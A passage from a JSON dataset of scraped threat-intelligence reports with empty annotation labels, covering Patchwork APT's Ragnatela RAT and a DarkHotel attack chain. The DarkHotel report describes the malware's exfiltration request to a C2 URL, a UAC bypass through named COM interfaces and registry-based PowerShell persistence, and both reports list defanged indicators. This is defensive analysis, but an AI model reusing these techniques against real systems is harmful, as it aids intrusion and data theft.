                "Ragnatela, which means spider web in Italian, is also the project name and panel used by Patchwork APT.",
                "Ragnatela RAT was built sometime in late November as seen in its Program Database (PDB) path “E:\\new_ops\\jlitest __change_ops -29no",
                "Copy\\Release\\jlitest.pdb”.",
                "Executing commands via cmdCapturing screenshotsLogging Keystrokes Collecting list of all the files in victim’s machineCollecting list of the running applications in the victim’s machine at a specific time periodsDowning addition payloadsUploading files",
                "In order to distribute the RAT onto victims, Patchwork lures them with documents impersonating Pakistani authorities.",
                "For example, a document called EOIForm.rtf was uploaded by the threat actor onto their own server at karachidha[.]org/docs/.",
                "Figure 3: Threat actor is logged into their web control panel",
                "That file contains an exploit (Microsoft Equation Editor) which is meant to compromise the victim’s computer and execute the final payload (RAT).",
                "Figure 4: Malicious document triggers exploit",
                "That payload is stored within the RTF document as an OLE object.",
                "We can deduce the file was created on December 9 2021 based on the source path information.",
                "Figure 5: OLE object containing RAT",
                "Ragnatela RAT communicates with the attacker’s infrastructure via a server located at bgre.kozow[.]com.",
                "Prior to launching this campaign (in late November), the threat actor tested that their server was up and running properly.",
                "Figure 6: Log of threat actor typing a ping command",
                "The RAT (jli.dll) was also tested in late November before its final compilation on 2021-12-09, along with MicroScMgmt.exe used to side-load it.",
                "Figure 7: DLL for the RAT being compiled",
                "Also in late November, we can see the threat actor testing the side-loading in a typical victim machine.",
                "Figure 8: Threat actor tests RAT",
                "We were able to gain visibility on the victims that were successfully compromised:",
                "Ministry of Defense- Government of PakistanNational Defense University of Islam AbadFaculty of Bio-Science, UVAS University, Lahore, PakistanInternational center for chemical and biological sciencesHEJ Research institute of chemistry, International center for chemical and biological sciences, univeristy of KarachiSHU University, Molecular medicine",
                "Another",
                "unintentional",
                "victim is the threat actor himself which appears to have infected is own development machine with the RAT.",
                "We can see them running both VirtualBox and VMware to do web development and testing.",
                "Their main host has dual keyboard layouts (English and Indian).",
                "Figure 9: Virtual machine running on top of threat actor’s main computer",
                "Other information that can be obtained is that the weather at the time was cloudy with 19 degrees and that they haven’t updated their Java yet.",
                "On a more serious note, the threat actor uses VPN Secure and CyberGhost to mask their IP address.",
                "Figure 10: Threat actor uses VPN-S",
                "Under the VPN they log into their victim’s email and other accounts stolen by the RAT.",
                "Figure 11: Threat actor logs into his victim’s email using CyberGhost VPN",
                "This blog gave an overview of the latest campaign from the Patchwork APT.",
                "While they continue to use the same lures and RAT, the group has shown interest in a new kind of target.",
                "Indeed this is the first time we have observed Patchwork targeting molecular medicine and biological science researchers.",
                "Thanks to data captured by the threat actor’s own malware, we were able to get a better understanding about who sits behind the keyboard.",
                "The group makes use of virtual machines and VPNs to both develop, push updates and check on their victims.",
                "Patchwork, like some other East Asian APTs is not as sophisticated as their Russian and North Korean counterparts.",
                "North Korea’s Lazarus APT leverages Windows Update client, GitHub in latest campaign",
                "January 27, 2022 - How one of North Korea's most sophisticated APTs tries to avoid detection by using legitimate tools during its attacks.",
                "November 18, 2021 - The FBI has revealed that APT actors have been abusing a zero-day in FatPipe's MPVPN, WARP, and IPVPN products since May.",
                "A multi-stage PowerShell based attack targets Kazakhstan",
                "November 12, 2021 - We uncover a new attack delivered via a number of PowerShell scripts to deploy Cobalt Strike.",
                "FBI and CISA warn of APT groups exploiting ADSelfService Plus",
                "September 17, 2021 - APT actors are exploiting a recently-discovered flaw in ManageEngine's self-service password management product.",
                "Kimsuky APT continues to target South Korean government using AppleSeed backdoor",
                "June 1, 2021 - Kimsuky, the North Korean threat actor active since 2012, is still targeting the South Korean government.",
                "We take a look at the phishing infrastructure and command and control mechanisms of this APT.",
                "Cybersecurity info you can't do without",
                "Want to stay informed on the latest news in cybersecurity?",
                "Sign up for our newsletter and",
                "how to protect your computer from threats.",
                "3979 Freedom Circle, 12th FloorSanta Clara, CA 95054",
                "One Albert Quay, 2nd FloorCork T12 X8N6Ireland",
                "Your intro to everything relating to cyberthreats, and how to stop them.",
                "You must be logged in to post a comment."
            ],
            "sentencesNum": 77,
            "words": [
                "The official Malwarebytes logo",
                "B",
                "We research.",
                "You level up.",
                "Personal",
                "Personal",
                "Security & Antivirus",
                "Malwarebytes for Windows",
                "Malwarebytes for Mac",
                "Malwarebytes for Chromebook",
                "Malwarebytes Browser Guard",
                "Overview",
                "Security & Antivirus for Mobile",
                "Malwarebytes for Android",
                "Malwarebytes for iOS",
                "Online Privacy",
                "Malwarebytes Privacy VPN",
                "Get Started",
                "Explore all Personal Products",
                "Explore Pricing",
                "Free Trial of Malwarebytes Premium",
                "Get free trial",
                "Business",
                "Business",
                "Solutions",
                "BY COMPANY SIZE",
                "Small Business  1-99 Employees",
                "Mid-size Businesses  100-999 Employees",
                "Large Enterprise  1000+ Empoyees",
                "BY INDUSTRY",
                "Education",
                "Finance",
                "Healthcare",
                "Products",
                "NEXT-GEN ANTIVIRUS FOR SMALL BUSINESSES",
                "For Teams",
                "ENTERPRISE-CLASS PROTECTION, DETECTION, AND REMEDIATION",
                "Endpoint Protection",
                "Endpoint Detection & Response",
                "Incident Response",
                "Remediation for CrowdStrike®",
                "ADVANCED SERVER PROTECTION",
                "Endpoint Protection for Servers",
                "Nebula",
                "Get Started",
                "See business pricing",
                "Don't know where to start?",
                "Help me choose a product",
                "Get a free trial",
                "Call us now",
                "+1-800-520-2796",
                "Pricing",
                "Partners",
                "Partners",
                "Explore Partnerships",
                "Partner Solutions",
                "Resellers",
                "Managed Service Providers",
                "Computer Repair",
                "Technology Partners",
                "Partner Success Story",
                "Marek Drummond",
                "Managing Director at Optimus Systems",
                "See full story",
                "Resources",
                "Resources",
                "Learn About Cybersecurity",
                "Antivirus",
                "Malware",
                "Ransomware",
                "See all",
                "Malwarebytes Labs",
                "Explore",
                "Business Resources",
                "Reviews",
                "Analyst Reports",
                "Case Studies",
                "See all",
                "Press & News",
                "Learn more",
                "Events",
                "Featured Event: RSA 2021",
                "See Event",
                "Support",
                "Support",
                "Technical Support",
                "Support",
                "Premium Services",
                "Forums",
                "Vulnerability Disclosure",
                "Training for Personal Products",
                "Training for Business Products",
                "Featured Content",
                "See Content",
                "FREE DOWNLOAD",
                "CONTACT US",
                "COMPANY",
                "Company",
                "About Malwarebytes",
                "Careers",
                "News & Press",
                "SIGN IN",
                "Sign In",
                "My Account",
                "Cloud Console",
                "Partner Portal",
                "SUBSCRIBE",
                "Save 25% Today >",
                "Threat Intelligence",
                "Ragnatela",
                "Figure 1: Patchwork’s Ragnatela panel",
                "It features the following capabilities:",
                "Figure 2: Ragnatela commands",
                "Victims and victim",
                "Conclusion",
                "Indicators of Compromise",
                "Lure",
                "karachidha[.]org/docs/EOIForm.rtf5b5b1608e6736c7759b1ecf61e756794cf9ef3bb4752c315527bcc675480b6c6",
                "RAT",
                "jli.dll3d3598d32a75fd80c9ba965f000639024e4ea1363188f44c5d3d6d6718aaa1a3",
                "C2",
                "bgre[.]kozow[.]com",
                "Related",
                "SHARE THIS ARTICLE",
                "COMMENTS",
                "RELATED ARTICLES",
                "Threat Intelligence",
                "CONTINUE READINGNo Comments",
                "Exploits and vulnerabilities",
                "Patch now!",
                "FatPipe VPN zero-day actively exploited",
                "CONTINUE READINGNo Comments",
                "Threat Intelligence",
                "CONTINUE READINGNo Comments",
                "Exploits and vulnerabilities",
                "CONTINUE READINGNo Comments",
                "Threat Intelligence",
                "CONTINUE READINGNo Comments",
                "ABOUT THE AUTHOR",
                "Threat Intelligence Team",
                "Contributors",
                "Threat Center",
                "Podcast",
                "Glossary",
                "Scams",
                "Write for Labs",
                "learn",
                "Imagine a world without malware.",
                "We do.",
                "FOR",
                "PERSONAL",
                "FOR",
                "BUSINESS",
                "COMPANY",
                "ABOUT",
                "US",
                "CAREERS",
                "NEWS AND",
                "PRESS",
                "MY ACCOUNT",
                "SIGN",
                "IN",
                "CONTACT US",
                "GET",
                "SUPPORT",
                "CONTACT",
                "SALES",
                "English",
                "Legal",
                "Privacy",
                "Accessibility",
                "Terms of Service",
                "©",
                "All Rights Reserved",
                "Select your language",
                "Cybersecurity basics",
                "Loading Comments..."
            ],
            "wordsNum": 177,
            "labels": [
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                ""
            ]
        },
        {
            "time": "2021-12-16",
            "from_website": "Zscaler",
            "title": "New DarkHotel APT attack chain identified",
            "from_url": "https://www.zscaler.com/blogs/security-research/new-darkhotel-apt-attack-chain-identified",
            "content": [
                "New DarkHotel APT attack chain identified | Zscaler Skip to main contentThis site uses JavaScript to provide a number of functions, to use this site please enable JavaScript in your browser.",
                "Open Open Open     Search Toggle  Careers  Blog  Partners  Risk Assessment  Support  Contact Us  Sign In admin.zscaler.net admin.zscalerone.net admin.zscalertwo.net admin.zscalerthree.net admin.zscalerbeta.net admin.zscloud.net Zscaler Private Access    en  fr de ja es it     The world’s largest security platform built for the cloud    See The Difference   Zero Trust   Zscaler Difference   What is Zero Trust The strategy on which Zscaler was built   How Zscaler Delivers Zero Trust A platform that enforces policy based on context   Zero Trust Resources Learn its principles, benefits, strategies  See how the Zero Trust Exchange can help you leverage cloud, mobility, AI, IoT, and OT technologies to become more agile and reduce risk Learn More  Customer Testimonials Hear first-hand transformation stories   Case Studies Learn about pioneering Zscaler customers   Analyst Recognition Industry experts weigh in on Zscaler   See the Zscaler Cloud in Action Traffic processed, malware blocked, and more   Experience the Difference Get started with zero trust  See how the Zero Trust Exchange can help you leverage cloud, mobility, AI, IoT, and OT technologies to become more agile and reduce risk Learn More  Platform   Platform   Technology   Platform Overview Unified platform for transformation    Zero Trust Exchange    Zscaler Client Connector    Privacy and Compliance   Products Integrated services, infinitely scalable    Zscaler Internet Access    Zscaler Private Access    Zscaler Business to Business    Zscaler Cloud Protection    Zscaler Digital Experience    Zscaler Deception Technology   Accelerate your transformationProtect and empower your business by leveraging the platform, process and people skills to accelerate your zero trust initiatives  Learn More    Technologies Global proxy-based cloud architecture    Secure Web Gateway    Cloud Firewall    Cloud IPS    Cloud DLP    Cloud Sandbox    Cloud Browser Isolation    Cloud Configuration Security (CSPM)    Cloud Identity and Entitlements (CIEM)    Cloud Access Security Broker (CASB)   Capabilities Integrated services, infinitely scalable    SSL Inspection    Advanced Threat Protection    Bandwidth Control    Machine Learning Security    Security Service Edge    Secure Access Service Edge    Zero Trust Network Access    Cloud Security   Gartner Magic Quadrant LeaderZscaler: The Only Leader in the 2020 Gartner Magic Quadrant for Secure Web Gateways  Read the report    Solutions   Modern Workplace Enablement   Security Transformation   Infrastructure Modernization   Industries & Partners   Modern Workplace Enablement Overview Create fast, secure experiences for users everywhere   Secure Work-from-anywhere Seamless access for the hybrid workforce    VPN Alternative    M&A Divestitures    Security Cloud Migration    Third-party Access    ZTNA On-Premises    Remote Collaboration    Secure Access to OT Systems   Ensure great digital experiences Seamless access through fast, secure and reliable connectivity    Zscaler Digital Experience Score    SaaS/Application Monitoring    Cloudpath Analytics    Endpoint Monitoring    UCaaS Monitoring   Make hybrid work possibleSecure work from anywhere, protect data, and deliver the best experience possible for users  Get started    Security Transformation Overview A modern cloud approach   Prevent Cyberthreats Prevent phishing, ransomware, and other attacks    Ransomware Protection    Log4j   Prevent Data Loss Protect data everywhere from exposure or theft    Guest Wi-Fi Protection   The World’s Most Effective Ransomware ProtectionRansomware is the biggest threat to digital business.",
                "Learn how to take a proactive, zero trust approach to safeguarding your enterprise  Get Started    Infrastructure Modernization Overview Enable the new world of cloud and mobility   Simplify Branch Connectivity Simplify and secure direct-to-cloud connections    Office 365    Rethink Network Security    Direct-to-cloud Architecture   Secure Cloud Connectivity Secure connectivity between clouds and workloads   Enable the Agile BranchYour network security is costing more than it’s worth.",
                "See how five companies drove simplicity, savings and security  Watch Now    Industries Our ecosystem of zero trust partners    Zscaler for Public Sector    Zscaler for Federal    Zscaler for State and Local    Zscaler for Education    Zscaler for Australian Government    Zscaler for China    Zscaler for Banking and FS   Partner Integrations Simplified deployment and management    AWS    Microsoft    CrowdStrike    VMware    Aruba    Cisco    ServiceNow    SAP    Splunk   Secure your ServiceNow DeploymentIt’s time to protect your ServiceNow data better and respond to security incidents quicker  Get Started    Resources   Learn   Act   Engage   Content Library Explore topics that will inform your journey   Blog Perspectives from technology and transformation leaders   Tools Training, demos and more   CIO Library Essential resources for enterprise leaders   Webinars and Demos A first-hand look into important topics   Executive Insights App Security insights at your fingertips   Zero Trust Content LibraryDive into the latest security research and best practices  Get Started    Security & Threat Analytics Threat dashboards, cloud activity, IoT, and more   Security Advisories News about security events and protections   Vulnerability Disclosure Program Webinars, training, demos, and more   Trust Portal Zscaler cloud status and advisories   Zero Trust Content LibraryDive into the latest security research and best practices  Get Started    The Cloud-First Architect Tools and best practices for the cloud   CIO Insights Curated resources for technology leaders   Zenith Community Discuss ideas and issues with peers   CXO REvolutionaries Events, insights, and resources for CXOs   Training and Certifications Ongoing programs via Zero Trust Academy   Cloud Security Alliance Securing the cloud through best practices   Events Upcoming opportunities to meet with Zscaler   Zero Trust Content LibraryDive into the latest security research and best practices  Get Started    Company   About   Media   Partners   About Zscaler How it began, where it’s going   Leadership Meet our management team   Investor Relations News, stock information, and quarterly reports   Customers Learn about their transformation journeys   Compliance Our adherence to rigorous standards   ESG Our Environmental, Social, and Governance approach   Events Upcoming opportunities to meet with Zscaler   Zscaler CareersJoin a recognized leader in Zero trust to help organization transform securely  Apply Now    Media Center News, blogs, events, photos, logos, and other brand assets   News and Press Zscaler in the news   Zscaler CareersJoin a recognized leader in Zero trust to help organization transform securely  Apply Now    Partner Portal Tools and resources for Zscaler partners   Summit Partner Program Collaborating to ensure customer success   System Integrators Helping joint customers become cloud-first companies   Service Providers Delivering an integrated platform of services   Technology Deep integrations simplify cloud migration   Partner Inquiry Become a Zscaler partner   Zscaler CareersJoin a recognized leader in Zero trust to help organization transform securely  Apply Now     Request a demo   Request a demo  Insights and Research December 16, 2021New DarkHotel APT attack chain identifiedDarkHotel APT  SummaryIn November 2021, ThreatLabz identified a previously undocumented variant of an attack chain used by the South Korea-based Dark Hotel APT group.",
                "We also discovered new activity on the command-and-control (C2) infrastructure previously associated with this APT group.",
                "The new activity on their infrastructure aligns with the type of targets chosen by this threat actor in the past.In this blog, we describe our new findings in detail, including technical analysis of the attack chain and its components as well as the C2 infrastructure analysis.Threat attributionDarkHotel is an advanced persistent threat (APT) group based out of South Korea that has been active since at least 2007.",
                "They are known to target senior business executives by uploading malicious code to their computers through infiltrated hotel WiFi networks, as well as through spear-phishing and P2P attacks.We attribute this attack chain to the Dark Hotel APT group with a high level of confidence due to the below reasons:1.",
                "The multi-layer malicious document which drops a scriptlet post-exploitation.2.",
                "Filename of the dropped file system artifacts such as the scriptlet file - googleofficechk.sct3.",
                "The command-and-control (C2) commands are the same as earlier payloads used by Dark Hotel.4.",
                "Timestamps of the dropped payloads are around the same timeframe when previously documented Dark Hotel APT activity was observed.Attack flowFigure 1 below illustrates the full attack chain.Figure 1: Attack chain Technical analysisFor the purpose of technical analysis we will consider the document with MD5 hash: 89ec1f32e1bbf794c41fa5f5bc6869c0[+] Stage 1: Malicious documentThe first stage of this attack is a multi-layered malicious document which defines an AltChunk element to load an embedded DOCX file.",
                "The embedded DOCX file defines another AltChunk element which loads an embedded malicious RTF file.",
                "Figure 2 below shows one of the defined AltChunk elements and its corresponding relationship.Figure 2: AltChunk element and its corresponding relationshipThe malicious RTF file contains three OLE objects as shown in Figure 3Figure 3: OLE objects present inside malicious RTFWhen the RTF file is loaded, the three OLE objects are dropped in the %temp% directory with the names “p”, “b” and “googleofficechk.sct”.",
                "Out of these three dropped files, the scriptlet file (googleofficechk.sct) is executed which is described in detail in the next section.",
                "[+] Stage-2: Scriptlet fileSimilar to what has been described previously by Antiy Labs, the first operation performed by the scriptlet file is to send a Base64 encoded list of running processes to the configured C2 server.",
                "It sends a POST request to the URL “http://signing-config[.]com/cta/key.php” with DATA “L=G641giQQOWUiXE&q={Base64 encoded list of running processes}”The subsequent operations performed by this scriptlet file differ from what has been observed in past attacks.The scriptlet file in our case performs the following operations:1.",
                "Checks if the directory “%LOCALAPPDATA%\\PeerDistRepub\\” exists else creates it.2.",
                "Checks for the presence of file “%LOCALAPPDATA%\\PeerDistRepub\\msrvcd32.exe”.",
                "If the file exists, then it doesn't perform further operations.Note: This file check is likely performed to detect if the machine is already infected, which also indicates that the threat actor used multiple variations while performing the attack.",
                "Releases the IP addresses bound to all DHCP-enabled network adapters4.",
                "Copies the executable from “%temp%\\p” to “%LOCALAPPDATA%\\PeerDistRepub\\qq3104.exe”5.",
                "Copies the executable from “%temp%\\b” to “%LOCALAPPDATA%\\PeerDistRepub\\qq2688.exe”6.",
                "Creates a ZoneIdentifier ADS (Alternate Data Stream) corresponding to the files copied above with the following content:ZoneTransferZoneId=1Note: The ZoneID=1 is written to create the false evidence that the file was downloaded from the Intranet7.",
                "Execute the binary “qq3104.exe” whose functionality is described in detail in the next section8.",
                "Renew the IPv4 address for the network adaptersFigure 4 below shows the relevant scriptlet codeFigure 4: Scriptlet code[+] Stage-3: Dropped binaries# qq3104.exeAs mentioned in the previous section, the binary qq3104.exe gets executed as part of the operations performed by the scriptlet file.",
                "This binary mainly performs three operations:1.",
                "Spoofs the process related information in the PEB structure to pretend as explorer.exeFigure 5: Code snippet responsible for PEB modification2.",
                "Perform UAC bypass using elevation moniker against the vulnerable COM interfaces {3E5FC7F9-9A51-4367-9063-A120244FBEC7} and {D2E7041B-2927-42fb-8E9F-7CE93B6DC937}3.",
                "Execute the binary qq2688.exe# qq2688.exeThis binary on execution checks if there is any running process with the name “360Tray.exe” or “QQPCTray.exe” and does some firewall checks.",
                "These process names correspond to security software popularly used in China.The main operation performed by the binary is to register a Windows service which also serves as a persistence mechanism.",
                "To register the Windows service, the binary creates the registry key “HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\X” and populates the service related registry values.",
                "Along with the service related registry values, two additional registry values are defined with the name “s” and “x” under the same registry key.",
                "Based on the service registry values, it is an auto start service which executes VBScript code using mshta.exe.Figure 6: Code snippet responsible for registering the Windows serviceThe VBScript code in turn executes an encoded PowerShell command which is shown in Figure 8 belowFigure 7: Decoded PowerShell command executed by VBScript code[+] Stage-4: PowerShell scriptsThe PowerShell command which is executed as part of the service execution reads, decodes and executes the data stored under registry value “HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\X\\\\s”.The decoded data is a PowerShell script which executes another PowerShell command.",
                "The command is shown in Figure 9 below.Figure 8: Decoded PowerShell command executed by PowerShell scriptSimilar to the first PowerShell command it also reads, decodes and executes the data stored under registry value “HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\X\\\\x”.The decoded data is an obfuscated PowerShell script which embeds an encoded .NET dll.",
                "The .NET dll is loaded and executed in-memory from within the PowerShell script.",
                "[+] Stage-5: .NET dllThe .NET dll on analysis turns out to be the same downloader which is described in Antiy blog.",
                "The only changes are in the configured C2 servers and the parameters which are used as part of network requests.Information about the C2 servers is provided in Indicators of compromise section while the format for network requests is described below:Request format for data exfiltration:{C2 server URL}?im={MAC address}&mk=u&ltc={victim information}                OR{C2 server URL}?xt={MAC address}&mk=u&ltc={victim information}Request format for payload download:{C2 server URL}?im={MAC address}&mk=d            OR{C2 server URL}?xt={MAC address}&mk=d[+] C2 infrastructure analysisWe analyzed the C2 infrastructure related to the IP address of the server hosting the domain - signing-config[.]com.",
                "This domain was configured in the stage-2 scriptlet file and used to exfiltrate system information to the C2 server.IP address = 23.111.184[.]119Leveraging passive DNS data, we identified several domains hosted on the server with the above IP address and noticed a pattern in the domain names.",
                "]com/cta/key.php.NET backdoorhttp://svcstat[.]com/policy/v2.php?im=http://relay-server[.]com/mint/mvv.php?xt=[+] Files system artifacts# Dropped binaries%LOCALAPPDATA%\\PeerDistRepub\\qq3104.exe%LOCALAPPDATA%\\PeerDistRepub\\qq2688.exe%TEMP%\\p%TEMP%\\b# Scriptlet file%TEMP%\\googleofficechk.sct[+] Registry artifactsRegistry Key: HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\XRegistry Values: HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\X\\\\sHKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\X\\\\x Security Research Insights and Research               Authors  Sahil Antil   Sudeep Singh Recommended for You Analysis of Adobe Acrobat Pro DC Solid Framework Out-of-Bounds Read Vulnerability (CVE-2021-40729) Analysis of Xloader’s C2 Network Encryption New espionage attack by Molerats APT targeting users in the Middle East Three Cybersecurity Tips for a Safe and Happy HolidayStay up to date with the latest digital transformation tips and news.",
                "By submitting the form, you are agreeing to our privacy policy.",
                "newFirstName       Platforms & Products Zero Trust Exchange Zscaler Client Connector Zscaler Internet Access Zscaler Private Access Zscaler B2B Zscaler Cloud Protection Zscaler Digital ExperienceSolutions Modern Workplace Enablement Security TransformationTechnologies & Capabilities Secure Access Service Edge Zero Trust Network Access Secure Web Gateways Cloud Firewall Cloud IPS Cloud DLP Cloud Sandbox Cloud Browser Isolation Cloud SecurityTechnologies & Capabilities Cloud Configuration Security Cloud Identity and Entitlements CASB SSL Inspection Advanced Threat Protection Bandwidth Control Machine Learning SecurityPopular Links Careers About Zscaler Leadership Content Library Zscaler Tools News and Press Releases Media Kit CIO Library CXO REvolutionariesInformation Glossary Plans and Pricing Virtual Briefing Center Zscaler FAQs Contact Us      newFirstName  Follow Us:            SitemapPrivacyLegalSecurity  ©2022 Zscaler, Inc. All rights reserved.",
                "ZscalerTM and Zero Trust ExchangeTM are either (i) registered trademarks or service marks or (ii) trademarks or service marks of Zscaler, Inc. in the United States and/or other countries.",
                "Any other trademarks are the properties of their respective owners."
            ],
            "sentencesNum": 43,
            "words": [
                "3."
            ],
            "wordsNum": 1,
            "labels": [
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                ""
            ]
        }
    ],
    "info": {
        "sentencesNum": 1427,
        "wordsNum": 2853,
        "reportsNum": 9
    }
}